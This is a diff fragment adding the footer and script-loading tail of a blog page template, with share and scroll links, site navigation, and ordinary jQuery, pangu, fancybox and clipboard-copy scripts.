+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
